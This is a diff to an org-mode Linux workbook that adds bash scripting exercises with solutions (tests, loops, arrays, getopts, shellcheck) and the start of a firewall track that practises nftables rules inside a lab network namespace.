@@ -53,7 +53,8 @@ It checks the corpus and builds the extra inputs a few exercises need: practice
 files for track 0, a deliberately messy directory for the bash quoting lesson,
 some intentionally broken C for the debugging lessons, buggy programs in five
 languages for the debugger track, and practice data for the shell,
-permissions, processes, toolbox, git, archives and SQLite tracks. It only does this
+permissions, processes, toolbox, git, archives, firewall, SQLite, the
+security scenario and the binary-exploitation targets. It only does this
 once, so your edits survive restarts.
 
 Made a mess of the practice files? Run this block (=SPC c c=) to restore every
@@ -168,7 +169,7 @@ line, ending with =j= so the cursor is on the next line. =@a= replays, =3@a=
 replays three times.
 *** Solution
 On "apples": =qa0i- ESCjq=, then =3@a=. Macros are how you do a repetitive edit
-awk would be overkill for — track 20 comes back to them.
+awk would be overkill for — track 21 comes back to them.
 
 ** TODO E0.7 — Search and replace
 In edit-me.txt, replace every =the= with =THE=, confirming each one.
@@ -178,7 +179,7 @@ You'll meet: Ex commands (=:=), =:%s=, the =c= flag, =:w=.
 whole file; add =c= (=/gc=) to be asked at each match (=y= / =n=). =:w= saves.
 *** Solution
 =:%s/the/THE/gc RET=, answer =y= or =n=, then =:w RET= (or =SPC f s=). Emacs
-regex syntax differs from grep's for anything fancy — track 20 (E20.3) explores
+regex syntax differs from grep's for anything fancy — track 21 (E21.3) explores
 that. For plain words it just works.
 
 ** TODO E0.8 — Files, buffers, and windows
@@ -318,7 +319,7 @@ type again. =SPC l h= describes a symbol, =SPC l .= jumps to its definition,
 (note it answers =5/2= — an exact ratio, not 2.5). Then =(broken)=: the
 debugger opens listing /restarts/. Press the number next to =ABORT= (or =q=) to
 get back. In the debugger, =v= shows the source of a frame and =t= expands it.
-That debugger is a feature, not a crash — track 22 uses it deliberately.
+That debugger is a feature, not a crash — track 23 uses it deliberately.
 
 ** TODO E0.15 — Structural editing: slurp, barf, wrap, raise
 Work through [[file:/root/workbook-data/practice/parens.lisp][parens.lisp]]: all seven transformations, using only the
@@ -1576,7 +1577,7 @@ GNU grep's Perl mode (=-P=) does: =\b(\w+)\s+\1\b=.
 printf 'the the game\na a fresh start\nall is well\n' \
   | grep -P '\b(\w+)\s+\1\b'
 #+end_src
-Hitting grep's ceiling here is exactly why Perl (track 17) exists.
+Hitting grep's ceiling here is exactly why Perl (track 18) exists.
 
 * 7. sed
 :PROPERTIES:
@@ -1696,7 +1697,7 @@ with just the capture =\1= (add =-n ... p= so non-matching lines vanish). Under
 sed -nE 's/.*"assignee":"user([0-9]+)".*/\1/p' tickets.json | head
 #+end_src
 It works, but it is fragile (one object per line, exact key order). Real JSON
-wants =jq= or Python (track 18). Feeling that fragility is the point.
+wants =jq= or Python (track 19). Feeling that fragility is the point.
 
 * 8. awk
 :PROPERTIES:
@@ -1837,14 +1838,494 @@ awk -F, 'BEGIN{printf "%-4s %-9s %-6s %8s\n","ID","DEPT","BAND","SALARY"}
 :VISIBILITY: children
 :END:
 
-Gluing the tools together into repeatable programs. You'll discover that the
-hard part of shell is not logic but *quoting and word-splitting*, and that a
-handful of habits (strict mode, ="$@"=, =trap=, =mktemp=) separate scripts that
-work from scripts that eat your files.
+Gluing the tools together into repeatable programs. The first half (E9.1 to
+E9.12) is the language itself: tests, =case=, loops, reading files, arrays and
+=mapfile=, associative arrays, parameter expansion, arithmetic, functions,
+=getopts= and debugging. The second half (E9.13 on) puts it to work, and you'll
+discover that the hard part of shell is not logic but *quoting and
+word-splitting*, and that a handful of habits (strict mode, ="$@"=, =trap=,
+=mktemp=) separate scripts that work from scripts that eat your files.
 
-Write these as real files (=script.sh=, =chmod +x=), not one-liners.
+From E9.13 on, write these as real files (=script.sh=, =chmod +x=), not
+one-liners.
 
-** TODO E9.1 — Top 5 biggest files under a directory
+** TODO E9.1 — Tests and if/elif
+Write a function =describe PATH= that says whether a path is missing, a
+directory, an empty file, a big file (over 1 MB) or an ordinary file, with its
+size. Try it on a few paths. Then answer three yes/no questions with one-line
+tests: am I root? Does =employees.csv= end in =.csv=? What are the year and
+month in =2026-01-15=?
+You'll meet: =[[ ]]= vs =[ ]=, =-e= =-d= =-f= =-s=, =!=, =(( ))= for
+numbers, =if= / =elif= / =else=, =&&= as a short =if=, ==== with globs, =~=
+and =BASH_REMATCH=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=[[ ]]= is bash's test: inside it variables don't need quotes, =&&= and =||=
+work, ===== matches a glob (=*.csv=) and ==~= a regex, whose groups land in
+=BASH_REMATCH=. File tests: =-e= exists, =-d= directory, =-f= regular file,
+=-s= non-empty. Compare numbers with =(( a > b ))= or =-gt=; =>= inside =[[ ]]=
+compares /strings/, so ="9" > "10"=. The old =[ ]= is a command, not syntax,
+and needs every variable quoted.
+*** Solution
+#+begin_src bash :results output
+describe() {
+  local p=$1 size
+  if [[ ! -e $p ]]; then
+    echo "$p: missing"
+  elif [[ -d $p ]]; then
+    echo "$p: directory"
+  elif [[ ! -s $p ]]; then
+    echo "$p: empty file"
+  else
+    size=$(stat -c %s "$p")
+    if (( size > 1000000 )); then
+      echo "$p: big file ($size bytes)"
+    else
+      echo "$p: file ($size bytes)"
+    fi
+  fi
+}
+: > /tmp/empty.txt
+for p in /nope /root/corpus /tmp/empty.txt shakespeare.txt employees.csv; do describe "$p"; done
+[[ $(id -un) == root ]] && echo "running as root"
+[[ employees.csv == *.csv ]] && echo "employees.csv is a CSV"
+[[ 2026-01-15 =~ ^([0-9]{4})-([0-9]{2}) ]] && echo "year ${BASH_REMATCH[1]}, month ${BASH_REMATCH[2]}"
+#+end_src
+
+** TODO E9.2 — case: match patterns, not just values
+Label every file in the corpus by its name: =README.txt= is a guide, the
+snapshot is raw output, other =.txt= files are prose, =.csv= and =.json= are
+data, =.log= is logs.
+Then tally the HTTP status codes in =access.log= into 2xx, 3xx, 4xx and 5xx
+with one =case= inside a loop.
+You'll meet: =case ... in= / =esac=, =;;=, alternatives with =|=, glob
+patterns (=*=, =?=, =[...]=), =((var++))=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=case WORD in PATTERN) commands ;; ... esac= runs the first branch whose glob
+pattern matches, so put specific patterns before general ones; =*)= is the
+catch-all. =*.csv|*.json)= matches either.
+Patterns are globs, so =4??)= matches any three-character status starting with
+4. Watch out: =((n++))= returns failure when =n= was 0, which kills a script
+running under =set -e=; =((++n))= or =n=$((n + 1))= don't.
+*** Solution
+#+begin_src bash :results output
+for f in /root/corpus/*; do
+  case ${f##*/} in
+    README*)      kind=guide ;;
+    *snapshot*)   kind=raw ;;
+    *.txt)        kind=prose ;;
+    *.csv|*.json) kind=data ;;
+    *.log)        kind=logs ;;
+    *)            kind=other ;;
+  esac
+  printf '%-20s %s\n' "${f##*/}" "$kind"
+done
+ok=0 redirect=0 client=0 server=0
+while read -r status; do
+  case $status in
+    2??) ((++ok)) ;;
+    3??) ((++redirect)) ;;
+    4??) ((++client)) ;;
+    5??) ((++server)) ;;
+  esac
+done < <(awk '{print $9}' access.log)
+echo "2xx=$ok 3xx=$redirect 4xx=$client 5xx=$server"
+#+end_src
+
+** TODO E9.3 — Every kind of for loop
+Print 1 to 5; count down from 10 to 0 in steps of 2; count to a number held in
+a variable; print a 3×3 times table with nested loops. Loop over a glob that
+matches nothing and see what happens, then fix it. Finally loop over a list of
+words, skipping =skip= and stopping at =stop=.
+You'll meet: brace ranges ={1..5}= ={10..0..2}=, C-style =for ((;;))=, =seq=,
+nested loops, =shopt -s nullglob=, =continue=, =break=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=for x in LIST= takes words, brace ranges, globs or ="${array[@]}"=. Brace
+expansion happens /before/ variables are expanded, so ={1..$n}= doesn't work:
+use =for ((i = 1; i <= n; i++))= or =$(seq 1 "$n")=. A glob that matches
+nothing is left as the literal pattern unless =nullglob= is on.
+*** Solution
+#+begin_src bash :results output
+for i in {1..5}; do printf '%s ' "$i"; done; echo
+for ((i = 10; i >= 0; i -= 2)); do printf '%s ' "$i"; done; echo
+n=4
+for i in {1..$n}; do printf '%s ' "$i"; done; echo
+for ((i = 1; i <= n; i++)); do printf '%s ' "$i"; done; echo
+for i in 1 2 3; do for j in 1 2 3; do printf '%3d' $((i * j)); done; echo; done
+for f in *.nothing; do echo "got: $f"; done
+shopt -s nullglob
+for f in *.nothing; do echo "got: $f"; done
+shopt -u nullglob
+for w in alpha beta skip gamma stop delta; do
+  [[ $w == skip ]] && continue
+  [[ $w == stop ]] && break
+  echo "$w"
+done
+#+end_src
+The third line prints ={1..4}= literally: by the time =$n= became 4, brace
+expansion had already been and gone.
+
+** TODO E9.4 — while, until, and reading a file line by line
+Read =employees.csv= one line at a time, splitting the fields into named
+variables, and print the names and salaries of the first three people in
+=eng=. Then use =until= to wait for a file that a background job creates a
+second later, and report how many times you checked.
+You'll meet: =while IFS=, read -r ...; do ... done < FILE=, =-r=, =IFS=,
+skipping a header, =until=, =&= and =sleep=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=read -r a b c= splits a line on =IFS= into variables; the last one gets
+whatever is left. =IFS=,= set just for =read= splits on commas. Always use =-r=
+or backslashes get eaten. Redirect the file into =done=, not into =read=.
+=until COND= is =while ! COND=.
+*** Solution
+#+begin_src bash :results output
+n=0
+while IFS=, read -r id first last dept salary hired; do
+  [[ $id == id ]] && continue
+  [[ $dept == eng ]] || continue
+  echo "$first $last earns $salary"
+  (( ++n == 3 )) && break
+done < employees.csv
+rm -f /tmp/ready
+(sleep 1; touch /tmp/ready) &
+tries=0
+until [[ -e /tmp/ready ]]; do sleep 0.2; ((++tries)); done
+echo "ready after $tries checks"
+#+end_src
+
+** TODO E9.5 — The pipe trap
+Count the lines in =sherlock.txt= that mention Holmes by piping =grep= into a
+=while read= loop that adds one to a counter. Print the counter after the
+loop. Explain the answer, then fix it two different ways.
+You'll meet: subshells, why =cmd | while read= loses variables, =done < <(cmd)=,
+=shopt -s lastpipe=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Every part of a pipeline runs in its own subshell, a copy of the shell. The
+loop counts correctly, in a copy that's thrown away when the pipe ends. Either
+feed the loop with process substitution so it runs in the main shell, or turn
+on =lastpipe=, which runs the last part of a pipeline in the main shell (it
+works in scripts, not at an interactive prompt).
+*** Solution
+#+begin_src bash :results output
+count=0
+grep Holmes sherlock.txt | while read -r line; do ((++count)); done
+echo "pipe:                  $count"
+count=0
+while read -r line; do ((++count)); done < <(grep Holmes sherlock.txt)
+echo "process substitution:  $count"
+count=0
+shopt -s lastpipe
+grep Holmes sherlock.txt | while read -r line; do ((++count)); done
+echo "lastpipe:              $count"
+#+end_src
+(=grep -c= would do this in one go, of course. The trap bites when the loop
+does real work.)
+
+** TODO E9.6 — Arrays and mapfile
+Put every =.txt= file in the corpus into an array and print how many there
+are, the first, and the last. Load the rows of =employees.csv= (without the header)
+into another array and print the row count and row 500. Then build a list of
+names with spaces in them, add one more, and print it with both =${a[@]}= and
+=${a[*]}=: what's the difference? Loop over it by index.
+You'll meet: =a=(...)=, =${a[0]}=, =${a[-1]}=, =${#a[@]}=, =${!a[@]}=,
+slices =${a[@]:0:3}=, =+==, ="${a[@]}"=, =mapfile -t= (also called
+=readarray=), =-s= / =-n=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=a=(one "two words" three)= makes an array; a glob inside the parentheses
+fills it with file names, safely. =mapfile -t NAME < FILE= reads each line into
+an element (=-t= strips the newlines); =-s 1= skips a line, =-n 5= stops after
+five. Quoted ="${a[@]}"= expands to one word per element, keeping spaces;
+=${a[*]}= unquoted re-splits everything on spaces.
+*** Solution
+#+begin_src bash :results output
+books=(/root/corpus/*.txt)
+echo "${#books[@]} files; first ${books[0]##*/}; last ${books[-1]##*/}"
+mapfile -t rows < <(tail -n +2 employees.csv)
+echo "${#rows[@]} rows; row 500: ${rows[499]}"
+printf '  %s\n' "${rows[@]:0:3}"
+mapfile -t -s 1 -n 2 firsttwo < employees.csv
+printf 'skip 1, take 2: %s\n' "${firsttwo[@]}"
+names=("Ada Lovelace" "Alan Turing")
+names+=("Grace Hopper")
+printf '[%s] ' "${names[@]}"; echo
+printf '[%s] ' ${names[*]}; echo
+for i in "${!names[@]}"; do echo "$i: ${names[i]}"; done
+#+end_src
+
+** TODO E9.7 — Associative arrays: counting by key
+In pure bash, with no awk, compute each department's head count and average
+salary from =employees.csv=, highest average first. Compare with the awk
+version in E8.3. Then make a lookup table of department floors and check
+whether a key exists.
+You'll meet: =declare -A=, =${m[$key]}=, =${!m[@]}= (the keys), =[[ -v
+m[key] ]]=, arithmetic on array elements.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=declare -A m= makes a map from strings to strings. =((m[$k]++))= and
+=((t[$k] += x))= work because arithmetic treats the values as numbers. Keys come
+out in no particular order; pipe the output through =sort=. =[[ -v m[k] ]]=
+tests whether a key exists, which an empty value can't tell you.
+*** Solution
+#+begin_src bash :results output
+declare -A count total
+while IFS=, read -r id first last dept salary hired; do
+  [[ $id == id ]] && continue
+  (( count[$dept]++, total[$dept] += salary ))
+done < employees.csv
+for d in "${!count[@]}"; do
+  printf '%-10s %4d people  avg %d\n' "$d" "${count[$d]}" $(( total[$d] / count[$d] ))
+done | sort -k5 -rn
+declare -A floor=([eng]=3 [sales]=1 [ops]=1)
+for d in eng hr; do
+  if [[ -v floor[$d] ]]; then echo "$d is on floor ${floor[$d]}"; else echo "$d: no floor known"; fi
+done
+#+end_src
+
+** TODO E9.8 — Parameter expansion: string surgery without sed
+Starting from =path=/root/corpus/sherlock.txt=, print its directory, file
+name, extension and name without extension; the name in capitals; the path
+with every =o= replaced by =0=; its length; and 6 characters starting at
+position 6. Then use a default for an unset variable, assign a default, read a
+variable whose /name/ is in another variable, and make a required variable fail
+with a message.
+You'll meet: =${x%pat}= =${x%%pat}= =${x#pat}= =${x##pat}=, =${x//a/b}=,
+=${x^^}= =${x,,}=, =${#x}=, =${x:off:len}=, =${x:-def}=, =${x:=def}=,
+=${x:?msg}=, =${!name}=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=#= trims from the front and =%= from the back; doubled (=##=, =%%=) trims
+the longest match instead of the shortest. =${x/a/b}= replaces the first
+match, =${x//a/b}= all of them. =:-= substitutes a default without changing
+the variable, =:== also assigns it, =:?= aborts with your message. These run
+inside the shell, so they're much faster than calling =basename= or =sed= in a
+loop.
+*** Solution
+#+begin_src bash :results output
+path=/root/corpus/sherlock.txt
+file=${path##*/}
+echo "dir: ${path%/*}  file: $file  ext: ${file##*.}  stem: ${file%.*}"
+echo "upper: ${file^^}  capitalised: ${file^}"
+echo "replace: ${path//o/0}"
+echo "length: ${#path}  slice: ${path:6:6}"
+unset editor
+echo "editor: ${editor:-nano} (still unset: [${editor-}])"
+: "${pager:=less}"
+echo "pager is now $pager"
+name=HOME
+echo "indirect: \$$name is ${!name}"
+( : "${must_be_set:?must_be_set is required}" ) 2>&1
+#+end_src
+
+** TODO E9.9 — Arithmetic
+Add up every salary in =employees.csv= in a bash loop and print the count, the
+total and the average. Then print the average to two decimal places, first
+with integer tricks and =printf=, then properly with awk. Also work out 7/2,
+7%2, 2 to the 10th, and the values of =0xff=, binary =1010= and octal =17=.
+You'll meet: =$(( ))=, =(( ))= as a condition, =+== in arithmetic, integer
+division, =%=, =**=, bases (=0x=, =2#=, =8#=), =printf '%.2f'=, awk for
+decimals.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Bash only does integer arithmetic: =$((7 / 2))= is 3. =$(( ))= gives a value,
+=(( ))= on its own is a command whose status is true when the result isn't zero,
+so it works in =if= and with =&&=. Inside both, variables don't need =$=. For
+real decimals hand the numbers to awk (or =bc=, which this lab leaves out).
+*** Solution
+#+begin_src bash :results output
+sum=0 n=0
+while IFS=, read -r _ _ _ _ salary _; do
+  [[ $salary == salary ]] && continue
+  (( sum += salary, n++ ))
+done < employees.csv
+echo "n=$n sum=$sum avg=$(( sum / n ))"
+printf 'integer trick: %d.%02d\n' $(( sum / n )) $(( sum * 100 / n % 100 ))
+awk -v s="$sum" -v n="$n" 'BEGIN { printf "awk: %.2f\n", s / n }'
+echo "7/2=$(( 7 / 2 )) 7%2=$(( 7 % 2 )) 2**10=$(( 2 ** 10 ))"
+echo "0xff=$(( 0xff )) 2#1010=$(( 2#1010 )) 8#17=$(( 8#17 ))"
+(( n > 900 )) && echo "more than 900 employees"
+#+end_src
+
+** TODO E9.10 — Functions that return things
+Write three functions: =is_prime N=, which reports through its exit status;
+=max_salary DEPT=, which prints the top salary for a department so you can
+capture it with =$( )=; and =dept_names ARRAY=, which fills an array whose
+name you pass in. Use them to list the primes up to 30, test 91, and print the
+departments.
+You'll meet: =return= (status 0–255) vs printing a result, =$?=, =if func=,
+=local=, =local -n= (a name reference).
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+A function returns only a status, like a command: 0 means success/true. To
+give back data, print it and let the caller capture it with =$(func)=. To fill
+an array or several variables, pass a variable /name/ and use =local -n ref=$1=
+inside; =ref= then is the caller's variable. Make every helper variable
+=local=, or it overwrites the caller's.
+*** Solution
+#+begin_src bash :results output
+is_prime() {
+  local n=$1 i
+  (( n < 2 )) && return 1
+  for (( i = 2; i * i <= n; i++ )); do
+    (( n % i == 0 )) && return 1
+  done
+  return 0
+}
+max_salary() {
+  awk -F, -v d="$1" '$4 == d && $5 > m { m = $5 } END { print m }' /root/corpus/employees.csv
+}
+dept_names() {
+  local -n out=$1
+  mapfile -t out < <(tail -n +2 /root/corpus/employees.csv | cut -d, -f4 | sort -u)
+}
+primes=()
+for n in {1..30}; do is_prime "$n" && primes+=("$n"); done
+echo "primes: ${primes[*]}"
+is_prime 91; echo "is_prime 91 -> status $? (91 = 7 x 13)"
+if is_prime 97; then echo "97 is prime"; fi
+echo "top eng salary: $(max_salary eng)"
+dept_names depts
+echo "${#depts[@]} departments: ${depts[*]}"
+#+end_src
+
+** TODO E9.11 — getopts: a real command-line interface
+Rebuild the corpus search tool from E9.15 the way real tools work:
+=csearch.sh [-i] [-c] [-n MAX] PATTERN [FILE...]=. =-i= ignores case, =-c=
+counts, =-n= stops after MAX matches per file, files default to the corpus
+books, and =-h= or a bad option prints usage and exits with status 2.
+You'll meet: =getopts=, the option string (=:icn:h=), =OPTARG=, =OPTIND=,
+=shift=, =set --=, building an argument array, =--=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=while getopts ':icn:h' opt; do case $opt in ... esac; done= handles one flag
+per pass; a colon after a letter means it takes a value (in =$OPTARG=). The
+leading colon lets you report errors yourself: =?= for an unknown flag, =:= for
+a missing value. Afterwards =shift $((OPTIND - 1))= drops the flags so =$1= is
+the pattern. Collect grep's options in an array so each stays one argument.
+*** Solution
+#+begin_src bash :results output
+cat > /root/workbook-data/csearch.sh <<'SH'
+#!/usr/bin/env bash
+set -euo pipefail
+usage() { echo "usage: ${0##*/} [-i] [-c] [-n MAX] PATTERN [FILE...]" >&2; exit 2; }
+flags=()
+while getopts ':icn:h' opt; do
+  case $opt in
+    i) flags+=(-i) ;;
+    c) flags+=(-c) ;;
+    n) [[ $OPTARG =~ ^[0-9]+$ ]] || usage; flags+=(-m "$OPTARG") ;;
+    h) usage ;;
+    :) echo "-$OPTARG needs a value" >&2; usage ;;
+    ?) echo "unknown option -$OPTARG" >&2; usage ;;
+  esac
+done
+shift $((OPTIND - 1))
+(( $# >= 1 )) || usage
+pattern=$1
+shift
+(( $# )) || set -- /root/corpus/*.txt
+grep -H "${flags[@]}" -- "$pattern" "$@"
+SH
+chmod +x /root/workbook-data/csearch.sh
+/root/workbook-data/csearch.sh -c Holmes
+/root/workbook-data/csearch.sh -i -n 2 watson sherlock.txt
+/root/workbook-data/csearch.sh -x Holmes; echo "exit $?"
+/root/workbook-data/csearch.sh -n; echo "exit $?"
+#+end_src
+
+** TODO E9.12 — Debugging: trace it, then lint it
+=/tmp/buggy.sh= below is the kind of script everyone writes once. Trace it
+running with line numbers, run =shellcheck= on it, and fix everything it
+reports.
+#+begin_src bash :results silent
+cat > /tmp/buggy.sh <<'SH'
+#!/usr/bin/env bash
+dir=$1
+for f in $(ls $dir/*.txt); do
+  words=`wc -w < $f`
+  if [ $words -gt 100000 ]; then
+    echo $f is long
+  fi
+done
+cd $dir/archive
+echo "would now delete: $(ls)"
+SH
+#+end_src
+You'll meet: =bash -x=, =PS4=, =set -x= / =set +x=, =shellcheck=, warnings
+like SC2045, SC2086 and SC2164.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=bash -x script= prints each command after expansion, prefixed by =$PS4=; put
+=${LINENO}= in =PS4= to see line numbers. Bash run as root ignores a =PS4=
+passed in the environment, so set it inside the shell that does the tracing. =set -x= ... =set +x= traces just a
+section. =shellcheck FILE= explains each problem with a code you can look up
+(=SC2086= and so on). The last two lines are the dangerous ones: if the =cd=
+fails, the script carries on in the /wrong directory/. In real scripts that
+line is often =rm -rf *=.
+*** Solution
+#+begin_src bash :results output
+bash -c 'PS4="+ line \${LINENO}: "; set -x; . /tmp/buggy.sh "$1"' _ /root/corpus 2>&1 | head -6
+shellcheck -f gcc /tmp/buggy.sh | cut -c1-110
+cat > /tmp/fixed.sh <<'SH'
+#!/usr/bin/env bash
+set -euo pipefail
+dir=${1:?usage: fixed.sh DIR}
+for f in "$dir"/*.txt; do
+  words=$(wc -w < "$f")
+  if (( words > 100000 )); then
+    echo "$f is long"
+  fi
+done
+cd "$dir/archive" || exit 1
+echo "would now delete: $(ls)"
+SH
+shellcheck /tmp/fixed.sh && echo "shellcheck: clean"
+bash /tmp/fixed.sh /root/corpus; echo "exit $?"
+#+end_src
+The fixed version stops at the failed =cd= instead of running on in
+=/root/corpus=.
+
+** TODO E9.13 — Top 5 biggest files under a directory
 A script =bigfiles.sh DIR= that prints the five largest files beneath DIR.
 You'll meet: command substitution, =find=, =du=/=sort=, quoting =$1=.
 *** Scratch
@@ -1863,7 +2344,7 @@ find "$dir" -type f -printf '%s\t%p\n' | sort -rn | head -5
 Run: =bash /root/workbook-data/bigfiles.sh /root/corpus=. (=:tangle= writes the
 block to a file when you =C-c C-v t=.)
 
-** TODO E9.2 — Line/word/char counts for every book
+** TODO E9.14 — Line/word/char counts for every book
 Loop the =*.txt= files; print a row per file plus a total.
 You'll meet: =for= over a glob, capturing =wc= output, arithmetic.
 *** Scratch
@@ -1885,7 +2366,7 @@ done
 printf "%6d %6d %8d  TOTAL\n" "$tl" "$tw" "$tc"
 #+end_src
 
-** TODO E9.3 — A grep-across-the-corpus wrapper
+** TODO E9.15 — A grep-across-the-corpus wrapper
 =search.sh PATTERN= greps every corpus file, case-insensitive, with filenames,
 and exits nonzero if nothing matched.
 You'll meet: =$#=/=$1=, a usage message, ="$@"=, exit status.
@@ -1903,7 +2384,7 @@ if [ $# -lt 1 ]; then echo "usage: search.sh PATTERN..." >&2; exit 2; fi
 grep -rinE "$*" /root/corpus
 #+end_src
 
-** TODO E9.4 — Rename the messy files safely
+** TODO E9.16 — Rename the messy files safely
 In =/root/workbook-data/messy=, lowercase every =.JPG= to =.jpg=. The filenames
 contain spaces and punctuation — do it without corrupting anything.
 You'll meet: THE quoting lesson — =-print0=, =read -d ''=, ="$var"= everywhere.
@@ -1928,7 +2409,7 @@ done
 Try the naive =for f in $(ls *.JPG)= version too, and watch it shred the
 space-containing names. That contrast is the whole lesson.
 
-** TODO E9.5 — Make failure loud
+** TODO E9.17 — Make failure loud
 Write a two-command pipeline where the first command fails, and show that the
 script *doesn't* notice — then make it notice.
 You'll meet: =set -euo pipefail=, and why every serious script starts with it.
@@ -1946,7 +2427,7 @@ bash -c 'false | wc -l; echo "exit=$?  (looks fine, but false failed)"'
 bash -c 'set -o pipefail; false | wc -l; echo "exit=$?  (now the failure shows)"'
 #+end_src
 
-** TODO E9.6 — A reusable function + a self-cleaning temp file
+** TODO E9.18 — A reusable function + a self-cleaning temp file
 Write =count_matches PATTERN FILE= as a function, and have the script stage work
 in a =mktemp= file that is removed even if the script dies.
 You'll meet: functions, =local=, =mktemp=, =trap ... EXIT=.
@@ -1968,7 +2449,7 @@ echo "Holmes count: $(count_matches Holmes /root/corpus/sherlock.txt)"
 # on exit, trap removes $tmp automatically
 #+end_src
 
-** TODO E9.7 — Compare two department rosters without temp files
+** TODO E9.19 — Compare two department rosters without temp files
 Produce the sorted list of employees in =eng= and in =sales=, and diff them —
 using no intermediate files.
 You'll meet: process substitution =<(...)=.
@@ -2602,7 +3083,634 @@ this$  cd /root/workbook-data/git/project
 this$  git remote add peer peer:/root/calc.git && git push peer main
 #+end_example
 
-* 13. The modern command line
+* 13. Firewalls, routing & traffic control
+:PROPERTIES:
+:VISIBILITY: children
+:END:
+
+Every packet that reaches a Linux machine passes through two kernel systems you
+can program from the shell. /netfilter/ decides whether a packet is allowed,
+rewritten or logged; it's what =nft= (modern) and =iptables= (classic) talk to.
+/Traffic control/ decides how fast and in what order packets leave; =tc= drives
+it, and its =netem= module can fake a slow, lossy network on demand.
+
+You need a second machine to point these at, so this track builds one inside
+your lab: a separate /network namespace/ called =server=, with its own network
+card, address and firewall, joined to your lab by a virtual cable. Your lab is
+=10.10.0.1=; the server is =10.10.0.2= and runs a web server on port 8000, an
+echo service on 9000, and SSH on 22. Firewall rules go /inside/ =server=, so
+nothing you do here can cut off your own lab. Every solution starts by running
+=mknet.sh=, which builds the server if it isn't there and does nothing if it is.
+
+From E13.10 on, routing gets a bigger network of its own, built by =mkroute.sh=:
+a LAN =10.1.0.0/24= holding a =client= (=.2=) and an attacker, =mallory=
+(=.66=); a =router= (=.1= on the LAN, =10.2.0.1= on the far side); and a
+=web= server at =10.2.0.2= (port 8000) that also plays a log server at
+=10.2.0.3= (syslog, UDP 514). Those exercises look at routing from both sides:
+how an attacker with root redirects or silences traffic, and how a defender
+spots and prevents it.
+
+Lost track of what you changed? This puts everything back: no firewall rules,
+no traffic shaping.
+
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh --reset && echo "server rebuilt"
+bash /root/workbook-data/net/mkroute.sh --reset && echo "routing network rebuilt"
+#+end_src
+
+** TODO E13.1 — A second machine inside your lab
+Build the server and look at it from both sides: list the namespaces, show
+each side's address, ping the server, fetch its web page, and list the ports
+listening /inside/ the server.
+You'll meet: =ip netns=, veth pairs, =ip -n NS=, =ip netns exec NS CMD=,
+=ss -tlnp=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=ip netns list= shows namespaces. =ip -n server addr= runs one =ip= command in
+=server=; =ip netns exec server CMD= runs any command there. A /veth pair/ is
+a virtual cable: =lab0= is your end, =srv0= is the server's. =ss -tlnp= lists
+listening TCP ports and their programs; run it inside the namespace to see the
+server's.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh
+ip netns list
+ip -br addr show lab0
+ip -n server -br addr
+ping -c 2 -q 10.10.0.2 | tail -1
+curl -s http://10.10.0.2:8000/
+ip netns exec server ss -tlnp | awk 'NR > 1 {print $4, $6}'
+#+end_src
+Run =ss -tlnp= without =ip netns exec= and you see your lab's ports instead:
+each namespace has its own sockets, routes and firewall. Containers are built
+from exactly this.
+
+** TODO E13.2 — nftables: block one port
+In the server, block port 9000 and leave everything else open. Do it twice:
+once by silently dropping the packets, once by rejecting them. Time a
+connection attempt each way. Which would you rather face as a user, and which
+as an attacker scanning ports?
+You'll meet: =nft add table= / =chain= / =rule=, hooks, =policy=, =drop= vs
+=reject=, =nft list ruleset=, =nft flush=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+nftables starts empty. You create a /table/ (=inet= covers IPv4 and IPv6), a
+/chain/ attached to a hook (=input= sees packets addressed to this machine),
+then /rules/ in the chain. =nc -zw3 HOST PORT= tries to connect, giving up
+after 3 seconds. A dropped packet gets no answer, so the client waits; a
+rejected one gets an immediate "connection refused".
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh
+ip netns exec server nft flush ruleset
+ip netns exec server nft add table inet filter
+ip netns exec server nft add chain inet filter input '{ type filter hook input priority 0; policy accept; }'
+ip netns exec server nft add rule inet filter input tcp dport 9000 drop
+ip netns exec server nft list ruleset
+{ time nc -zw3 10.10.0.2 9000; } 2>&1 | grep real
+ip netns exec server nft flush chain inet filter input
+ip netns exec server nft add rule inet filter input tcp dport 9000 reject with tcp reset
+{ time nc -zw3 10.10.0.2 9000; } 2>&1 | grep real
+nc -zw1 10.10.0.2 8000 && echo "8000 still open"
+#+end_src
+Drop makes the client hang until it times out, which slows down scanners but
+also confuses legitimate users. Reject fails fast and honestly.
+
+** TODO E13.3 — Default deny
+Turn the server's firewall around: refuse everything, then allow only what's
+needed. Allow SSH, ping, and replies to connections the server itself makes.
+Check which ports are reachable. Then find the SSH rule's handle and delete
+just that rule.
+You'll meet: =policy drop=, =ct state established,related=, =iif lo=, =icmp
+type echo-request=, =counter=, =nft -a= (handles), =nft delete rule ...
+handle N=, =nft -f -=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+With =policy drop= anything no rule accepts is dropped. Connection tracking
+(=ct=) remembers connections, so =ct state established,related accept= lets
+replies back in without opening ports. Always accept loopback (=iif lo=). A
+whole ruleset can be loaded at once from a file or stdin with =nft -f=. =nft -a
+list ...= shows each rule's /handle/, its ID for deleting.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh
+ip netns exec server nft flush ruleset
+ip netns exec server nft -f - <<'NFT'
+table inet filter {
+    chain input {
+        type filter hook input priority 0; policy drop;
+        ct state established,related accept
+        iif lo accept
+        icmp type echo-request counter accept
+        tcp dport 22 counter accept
